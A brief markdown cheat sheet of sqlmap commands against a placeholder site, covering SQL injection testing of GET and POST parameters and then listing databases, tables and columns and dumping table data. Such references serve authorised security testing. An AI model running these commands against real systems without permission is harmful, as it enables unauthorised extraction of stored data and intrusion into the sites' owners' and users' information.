# SQLMap Basic Commands

## Simple URL test
sqlmap -u "http://testsite.com/page?id=1"

## POST request test
sqlmap -u "http://testsite.com/login" --data="user=admin&pass=123"

## Get databases
sqlmap -u "http://testsite.com/page?id=1" --dbs

## Get tables
sqlmap -u "http://testsite.com/page?id=1" -D dbname --tables

## Get columns
sqlmap -u "http://testsite.com/page?id=1" -D dbname -T tablename --columns

## Dump data
sqlmap -u "http://testsite.com/page?id=1" -D dbname -T tablename --dump
